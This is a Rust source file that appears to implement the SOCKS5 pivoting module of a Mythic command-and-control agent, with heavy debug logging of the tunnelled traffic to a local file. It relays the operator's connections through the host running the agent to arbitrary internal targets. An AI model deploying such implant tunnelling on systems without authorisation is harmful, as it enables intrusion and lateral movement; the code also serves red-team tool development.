// POC by Gerar - instrumented for deep debug
use crate::agent::AgentTask;
use crate::mythic_continued;

use base64::{decode, encode};
use serde_json::{json, Value};

use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;

use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as tokio_mpsc;
use tokio::time::{timeout, Duration};

// --- new imports for file logging ---
use std::fs::OpenOptions;
use std::io::Write as _; // bring std::io::Write trait into scope
use std::time::{SystemTime, UNIX_EPOCH};

/* -------------------------- Debug helpers -------------------------- */

const HEX_MAX: usize = 64;

// --- file logging helper ---
fn append_log_line(task_id: &str, title: &str, detail: &str) {
    // Default to C:\logs.txt; override with AGENT_LOG_PATH if set
    let default_path = r"C:\logs.txt".to_string();
    let path = std::env::var("AGENT_LOG_PATH").unwrap_or(default_path);

    // Try primary, then fallback to %TEMP%\socks.log
    let mut file = match OpenOptions::new().create(true).append(true).open(&path) {
        Ok(f) => f,
        Err(_) => {
            let fallback = std::env::temp_dir().join("socks.log");
            match OpenOptions::new().create(true).append(true).open(&fallback) {
                Ok(f) => f,
                Err(_) => return, // if both fail, silently skip file logging
            }
        }
    };

    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);

    let _ = writeln!(file, "{} | task={} | {} | {}", ts, task_id, title, detail);
    let _ = file.flush();
}

fn debug_to_mythic<T: Into<String>, U: Into<String>>(
    tx: &std_mpsc::Sender<Value>,
    task_id: &str,
    title: T,
    detail: U,
) {
    // to file
    let title_s: String = title.into();
    let detail_s: String = detail.into();
    append_log_line(task_id, &title_s, &detail_s);

    // to Mythic
    let _ = tx.send(mythic_continued!(task_id, title_s, detail_s));
}

fn hex_preview(data: &[u8], max: usize) -> String {
    use std::fmt::Write;
    let mut s = String::new();
    let take = data.len().min(max);
    for b in &data[..take] {
        let _ = write!(&mut s, "{:02x}", b);
    }
    if data.len() > max {
        s.push('…');
    }
    s
}

/* ------------------------------- SOCKS utils ------------------------------ */

fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    // REP codes: 0x00 ok, 0x01 general fail, 0x05 conn refused, 0x03 net unreachable, etc.
    let mut out = vec![0x05, rep, 0x00]; // VER=5, REP, RSV=0
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01); // ATYP=IPv4
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04); // ATYP=IPv6
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            // Unknown/none, report 0.0.0.0:0
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

fn send_socks_packet(
    tx: &std_mpsc::Sender<serde_json::Value>,
    task_id: &str, // used by comms wrapper (post_response)
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn std::error::Error>> {
    // debug log before sending
    debug_to_mythic(
        tx,
        task_id,
        "wire.a2m.send",
        format!(
            "sid={server_id}; exit={exit}; bytes={}; hex={}",
            data.len(),
            hex_preview(data, HEX_MAX)
        ),
    );

    let sid_json = match server_id.parse::<u64>() {
        Ok(n) => serde_json::json!(n),
        Err(_) => serde_json::json!(server_id),
    };

    // Emit a plain response object; comms will wrap in {"action":"post_response","responses":[...]}
    tx.send(serde_json::json!({
        "task_id": task_id,
        "socks": [{
            "server_id": sid_json,
            "data": encode(data),
            "exit": exit
        }]
    }))?;
    Ok(())
}

fn send_exit_only(tx: &std_mpsc::Sender<serde_json::Value>, task_id: &str, server_id: &str) {
    let _ = send_socks_packet(tx, task_id, server_id, &[], true);
}

fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
    // Expect: VER=0x05, CMD=0x01 (CONNECT), RSV=0x00, ATYP=...
    if decoded.len() < 4 {
        return Err("SOCKS5 request too short".into());
    }
    if decoded[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }
    if decoded[1] != 0x01 {
        return Err("SOCKS5 command not supported (only CONNECT)".into());
    }
    if decoded[2] != 0x00 {
        return Err("RSV must be 0x00".into());
    }

    match decoded[3] {
        0x01 => {
            // IPv4
            if decoded.len() < 10 {
                return Err("Malformed IPv4 CONNECT frame".into());
            }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port))
        }
        0x03 => {
            // DOMAIN
            if decoded.len() < 5 {
                return Err("Malformed domain CONNECT frame (no length)".into());
            }
            let len = decoded[4] as usize;
            if len == 0 || len > 255 {
                return Err("Bad domain length".into());
            }
            let need = 5 + len + 2;
            if decoded.len() < need {
                return Err("Malformed domain CONNECT frame (truncated)".into());
            }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
            Ok((domain, port))
        }
        0x04 => {
            // IPv6
            let need = 4 + 16 + 2;
            if decoded.len() < need {
                return Err("Malformed IPv6 CONNECT frame".into());
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port))
        }
        _ => Err("Unsupported ATYP in SOCKS5 request".into()),
    }
}

/* ------------------------- Minimal packet extraction ----------------------- */

fn as_string_or_number(v: &Value) -> Option<String> {
    if let Some(s) = v.as_str() {
        return Some(s.to_string());
    }
    if let Some(n) = v.as_u64() {
        return Some(n.to_string());
    }
    if let Some(n) = v.as_i64() {
        return Some(n.to_string());
    }
    None
}

// Accepts a single SOCKS item of shape: {server_id, data, exit?}
fn normalize_socks_item(v: &Value) -> Option<Value> {
    let sid = v.get("server_id").and_then(as_string_or_number)?;
    let data = v
        .get("data")
        .or_else(|| v.get("chunk_data"))
        .and_then(|x| x.as_str())
        .unwrap_or("")
        .to_string();
    let exit = v
        .get("exit")
        .or_else(|| v.get("close"))
        .and_then(|x| x.as_bool())
        .unwrap_or(false);

    Some(json!({
        "server_id": sid,
        "data": data,
        "exit": exit
    }))
}

/* ------------------------- Fragmentation & Greeting helpers ---------------- */

async fn recv_min_bytes(
    sess_rx: &mut tokio_mpsc::UnboundedReceiver<serde_json::Value>,
    mut have: Vec<u8>,
    need: usize,
) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    while have.len() < need {
        let v = sess_rx.recv().await.ok_or("channel closed before header")?;
        if v.get("exit").and_then(|x| x.as_bool()).unwrap_or(false) {
            return Err("got exit while reading header".into());
        }
        let chunk_b64 = v.get("data").and_then(|x| x.as_str()).unwrap_or("");
        let mut chunk = decode(chunk_b64)?;
        have.append(&mut chunk);
    }
    Ok(have)
}

fn looks_like_socks5_greeting(b: &[u8]) -> bool {
    // VER=0x05, NMETHODS=n, followed by n bytes (we allow > header to accommodate coalesced reads)
    if b.len() < 2 || b[0] != 0x05 {
        return false;
    }
    let n = b[1] as usize;
    b.len() >= 2 + n
}

/* ----------------------------- Session handler ---------------------------- */

async fn run_session(
    parent_task_id: String,
    server_id: String,
    mut sess_rx: tokio::sync::mpsc::UnboundedReceiver<serde_json::Value>,
    tx_out: std_mpsc::Sender<serde_json::Value>,
) -> Result<(), Box<dyn std::error::Error>> {
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "session.start",
        format!("server_id={server_id}"),
    );

    // ---- First packet from Mythic side ----
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => {
            debug_to_mythic(&tx_out, &parent_task_id, "session.abort", "no-initial-packet");
            return Ok(());
        }
    };

    let b64 = first["data"].as_str().unwrap_or("");
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "dispatcher.first_pkt",
        format!("sid={server_id}; b64_len={}", b64.len()),
    );

    let mut decoded = match decode(b64) {
        Ok(d) => d,
        Err(e) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "decode.fail",
                format!("sid={server_id}; err={e} b64_len={}", b64.len()),
            );
            let _ = send_socks_packet(
                &tx_out,
                &parent_task_id,
                &server_id,
                &build_reply(0x07, None),
                true,
            );
            return Ok(());
        }
    };

    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "dispatcher.first_decoded",
        format!(
            "sid={server_id}; bytes={}; hex={}",
            decoded.len(),
            hex_preview(&decoded, HEX_MAX)
        ),
    );

    // Some Mythic setups might forward an initial GREETING; if so, log and read again
    if looks_like_socks5_greeting(&decoded) {
        // Try to parse and just log the methods for visibility
        let n = decoded.get(1).copied().unwrap_or(0) as usize;
        let methods = if decoded.len() >= 2 + n {
            hex_preview(&decoded[2..2 + n], HEX_MAX)
        } else {
            "truncated".into()
        };
        debug_to_mythic(
            &tx_out,
            &parent_task_id,
            "greeting.unexpected",
            format!("sid={server_id}; nmethods={n}; methods_hex={methods}"),
        );

        // Read next packet — expecting CONNECT
        if let Some(v2) = sess_rx.recv().await {
            let b64_2 = v2.get("data").and_then(|x| x.as_str()).unwrap_or("");
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "greeting.next_pkt",
                format!("sid={server_id}; b64_len={}", b64_2.len()),
            );
            match decode(b64_2) {
                Ok(d2) => {
                    decoded = d2;
                    debug_to_mythic(
                        &tx_out,
                        &parent_task_id,
                        "greeting.next_decoded",
                        format!(
                            "sid={server_id}; bytes={}; hex={}",
                            decoded.len(),
                            hex_preview(&decoded, HEX_MAX)
                        ),
                    );
                }
                Err(e) => {
                    debug_to_mythic(
                        &tx_out,
                        &parent_task_id,
                        "greeting.next_decode_fail",
                        format!("sid={server_id}; err={e}"),
                    );
                    let _ = send_socks_packet(
                        &tx_out,
                        &parent_task_id,
                        &server_id,
                        &build_reply(0x07, None),
                        true,
                    );
                    return Ok(());
                }
            }
        } else {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "greeting.channel_closed",
                format!("sid={server_id}"),
            );
            return Ok(());
        }
    }

    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "connect.req",
        format!(
            "sid={server_id}; bytes={}; hex={}",
            decoded.len(),
            hex_preview(&decoded, HEX_MAX)
        ),
    );

    let (addr, port) = match parse_connect(&decoded) {
        Ok(v) => v,
        Err(e) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "connect.parse_err",
                format!("sid={server_id}; err={e} hex={}", hex_preview(&decoded, HEX_MAX)),
            );
            let _ = send_socks_packet(
                &tx_out,
                &parent_task_id,
                &server_id,
                &build_reply(0x07, None),
                true,
            );
            return Ok(());
        }
    };

    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "connect.try",
        format!("sid={server_id}; target={addr}:{port}"),
    );

    // Connect with timeout
    let remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await
    {
        Ok(Ok(s)) => s,
        Ok(Err(e)) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "connect.err",
                format!("sid={server_id}; err={e}"),
            );
            let rep = if e.to_string().to_lowercase().contains("refused") {
                0x05 // Connection refused
            } else if e.to_string().to_lowercase().contains("unreachable") {
                0x03 // Network/host unreachable
            } else {
                0x01 // General failure
            };
            let _ = send_socks_packet(
                &tx_out,
                &parent_task_id,
                &server_id,
                &build_reply(rep, None),
                true,
            );
            return Ok(());
        }
        Err(_) => {
            debug_to_mythic(
                &tx_out,
                &parent_task_id,
                "connect.timeout",
                format!("sid={server_id}; target={addr}:{port}"),
            );
            let _ = send_socks_packet(
                &tx_out,
                &parent_task_id,
                &server_id,
                &build_reply(0x01, None),
                true,
            );
            return Ok(());
        }
    };

    // Log actual local bind for debug (we still reply with 0.0.0.0:0)
    let bound_dbg = remote
        .local_addr()
        .ok()
        .map(|s| s.to_string())
        .unwrap_or_else(|| "unknown".into());

    let ok = build_reply(0x00, None); // reply as IPv4 0.0.0.0:0
    send_socks_packet(&tx_out, &parent_task_id, &server_id, &ok, false)?;
    debug_to_mythic(
        &tx_out,
        &parent_task_id,
        "connect.ok",
        format!("sid={server_id}; bound={bound_dbg}; reply_len={}", ok.len()),
    );

    // Split TCP into halves
    let (mut r_r, mut r_w) = remote.into_split();

    // ---- A2M: remote -> Mythic ----
    let tx_up = tx_out.clone();
    let sid_up = server_id.clone();
    let parent_up = parent_task_id.clone();
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        loop {
            match timeout(Duration::from_secs(300), r_r.read(&mut buf)).await {
                Ok(Ok(0)) => {
                    debug_to_mythic(&tx_up, &parent_up, "a2m.eof", format!("sid={sid_up}"));
                    send_exit_only(&tx_up, &parent_up, &sid_up);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        debug_to_mythic(
                            &tx_up,
                            &parent_up,
                            "a2m.read",
                            format!("sid={sid_up}; bytes={n}; hex={}", hex_preview(&buf[..n], HEX_MAX)),
                        );
                        let _ = send_socks_packet(&tx_up, &parent_up, &sid_up, &buf[..n], false);
                    }
                }
                Ok(Err(e)) => {
                    debug_to_mythic(
                        &tx_up,
                        &parent_up,
                        "a2m.read_err",
                        format!("sid={sid_up}; err={e}"),
                    );
                    send_exit_only(&tx_up, &parent_up, &sid_up);
                    break;
                }
                Err(_) => {
                    debug_to_mythic(&tx_up, &parent_up, "a2m.idle_timeout", format!("sid={sid_up}"));
                    send_exit_only(&tx_up, &parent_up, &sid_up);
                    break;
                }
            }
        }
    });

    // ---- M2A: Mythic -> remote ----
    let tx_dn = tx_out.clone();
    let sid_dn = server_id.clone();
    let parent_dn = parent_task_id.clone();
    let m2a = tokio::spawn(async move {
        while let Some(pkt) = sess_rx.recv().await {
            let exit = pkt.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);
            let b64 = pkt.get("data").and_then(|v| v.as_str()).unwrap_or("");
            debug_to_mythic(
                &tx_dn,
                &parent_dn,
                "m2a.recv",
                format!("sid={sid_dn}; exit={exit}; b64_len={}", b64.len()),
            );

            if exit {
                debug_to_mythic(&tx_dn, &parent_dn, "m2a.exit", format!("sid={sid_dn}"));
                let _ = r_w.shutdown().await;
                break;
            }
            match decode(b64) {
                Ok(bytes) => {
                    if !bytes.is_empty() {
                        debug_to_mythic(
                            &tx_dn,
                            &parent_dn,
                            "m2a.write",
                            format!("sid={sid_dn}; bytes={}; hex={}", bytes.len(), hex_preview(&bytes, HEX_MAX)),
                        );
                        let _ = timeout(Duration::from_secs(60), r_w.write_all(&bytes)).await;
                    } else {
                        debug_to_mythic(&tx_dn, &parent_dn, "m2a.empty", format!("sid={sid_dn}"));
                    }
                }
                Err(e) => {
                    debug_to_mythic(
                        &tx_dn,
                        &parent_dn,
                        "m2a.b64_err",
                        format!("sid={sid_dn}; err={e}"),
                    );
                }
            }
        }
        let _ = r_w.shutdown().await;
    });

    let _ = a2m.await;
    let _ = m2a.await;

    debug_to_mythic(&tx_out, &parent_task_id, "session.end", format!("sid={server_id}"));
    Ok(())
}

/* --------------------------------- Entry ---------------------------------- */

pub fn handle_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {

    // First message should be the AgentTask envelope (blocking)
    let task_val = rx.recv()?;
    let task: AgentTask = serde_json::from_value(task_val)?;

    debug_to_mythic(tx, &task.id, "socks.handler", "Dispatcher starting");

    // Bridge std::mpsc -> tokio::mpsc (fan-out socks arrays or single packets)
    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<Value>();
    {
        let parent_id = task.id.clone();
        let tx_dbg = tx.clone();
        std::thread::spawn(move || {
            debug_to_mythic(&tx_dbg, &parent_id, "bridge.spawn", "blocking→async started");

            while let Ok(v) = rx.recv() {
                // Try to log shapes we see from Mythic
                let shape = if v.get("socks").is_some() {
                    "top.socks_array"
                } else if v.get("server_id").is_some() && (v.get("data").is_some() || v.get("chunk_data").is_some()) {
                    "top.single_pkt"
                } else if v.get("parameters").is_some() {
                    "embedded.parameters"
                } else {
                    "unknown"
                };
                let sizes = v
                    .get("socks")
                    .and_then(|x| x.as_array())
                    .map(|a| a.len())
                    .unwrap_or(0);
                let b64_len = v
                    .get("data")
                    .and_then(|x| x.as_str())
                    .map(|s| s.len())
                    .unwrap_or(0);

                debug_to_mythic(
                    &tx_dbg,
                    &parent_id,
                    "bridge.recv",
                    format!("shape={shape}; socks_count={sizes}; top_b64_len={b64_len}"),
                );

                // 1) Top-level "socks": [ ... ]
                if let Some(arr) = v.get("socks").and_then(|x| x.as_array()) {
                    for it in arr {
                        if let Some(n) = normalize_socks_item(it) {
                            let _ = bridge_tx.send(n);
                        }
                    }
                    continue;
                }

                // 2) Single packet at top-level
                if v.get("server_id").is_some()
                    && (v.get("data").is_some() || v.get("chunk_data").is_some())
                {
                    if let Some(n) = normalize_socks_item(&v) {
                        let _ = bridge_tx.send(n);
                    }
                    continue;
                }

                // 3) Inside parameters (string or object)
                if let Some(params_val) = v.get("parameters") {
                    let inner: Value = match params_val {
                        Value::String(s) => serde_json::from_str::<Value>(s).unwrap_or(Value::Null),
                        v @ Value::Object(_) => v.clone(),
                        _ => Value::Null,
                    };

                    // 3a) Nested "socks": [ ... ]
                    if let Some(arr) = inner.get("socks").and_then(|x| x.as_array()) {
                        for it in arr {
                            if let Some(n) = normalize_socks_item(it) {
                                let _ = bridge_tx.send(n);
                            }
                        }
                        continue;
                    }

                    // 3b) Single embedded packet
                    if inner.get("server_id").is_some()
                        && (inner.get("data").is_some() || inner.get("chunk_data").is_some())
                    {
                        if let Some(n) = normalize_socks_item(&inner) {
                            let _ = bridge_tx.send(n);
                        }
                        continue;
                    }
                }
            }

            debug_to_mythic(&tx_dbg, &parent_id, "bridge.end", "blocking receiver closed");
        });
    }

    // Tokio runtime + dispatcher
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<Value>> = HashMap::new();
        let parent_task_id = task.id.clone();
        let mut seen: u64 = 0u64;

        debug_to_mythic(tx, &parent_task_id, "dispatcher.run", "awaiting SOCKS items");

        while let Some(item) = bridge_rx.recv().await {
            seen += 1;

            let sid = item["server_id"].as_str().unwrap_or("").to_string();
            let exit = item["exit"].as_bool().unwrap_or(false);
            let data_len = item["data"].as_str().map(|s| s.len()).unwrap_or(0);

            // periodic log
            debug_to_mythic(
                tx,
                &parent_task_id,
                "dispatcher.got",
                format!("count={seen}; sid={sid}; exit={exit}; data_b64_len={data_len}"),
            );

            // get/create session channel
            let entry = sessions.entry(sid.clone()).or_insert_with(|| {
                let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel::<Value>();
                let tx_out = tx.clone();
                let parent_id = parent_task_id.clone();
                let sid_clone = sid.clone();

                debug_to_mythic(
                    &tx_out,
                    &parent_id,
                    "session.spawn",
                    format!("sid={sid_clone}"),
                );

                tokio::spawn(async move {
                    if let Err(e) = run_session(parent_id, sid_clone, sess_rx, tx_out).await {
                        // keep it visible both places
                        eprintln!("socks session error: {e}");
                    }
                });
                sess_tx
            });

            // forward packet to the session; if the receiver is gone, drop the mapping
            if entry.send(item.clone()).is_err() {
                sessions.remove(&sid);
                debug_to_mythic(
                    tx,
                    &parent_task_id,
                    "dispatcher.drop_dead",
                    format!("sid={sid}"),
                );
            }

            // if exit flagged at dispatcher level, drop session mapping proactively
            if exit {
                sessions.remove(&sid);
                debug_to_mythic(
                    tx,
                    &parent_task_id,
                    "dispatcher.drop",
                    format!("sid={sid}"),
                );
            }
        }

        debug_to_mythic(
            tx,
            &parent_task_id,
            "dispatcher.end",
            "bridge closed; clearing sessions",
        );
        sessions.clear();
    });

    Ok(())
}

/* Back-compat for existing call site */
pub fn setup_socks(
    tx: &std_mpsc::Sender<Value>,
    rx: std_mpsc::Receiver<Value>,
) -> Result<(), Box<dyn Error>> {
    handle_socks(tx, rx)
}
